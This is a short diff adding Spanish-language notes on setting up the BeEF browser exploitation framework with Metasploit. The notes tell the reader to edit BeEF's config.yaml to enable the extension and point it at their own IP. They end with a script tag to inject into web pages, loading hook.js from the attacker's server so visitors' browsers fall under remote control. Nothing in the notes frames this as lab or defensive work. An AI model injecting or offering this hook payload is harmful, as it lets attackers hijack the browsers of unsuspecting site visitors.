@@ -1,0 +1,14 @@
+cd /usr/share/beef-xss/extensions/metasploit/  
+
+leafpad config.yaml
+beef:
+    extension:
+        metasploit:
+            name: 'Metasploit'
+            enable: true             <- FALSE cambiamos a TRUE
+            host: "127.0.0.1"      <- TU IP donde usaras beef
+            port: 55552
+
+llamar Script  para iny
+
+<script src="TU-IP:3000/hook.js"></script>
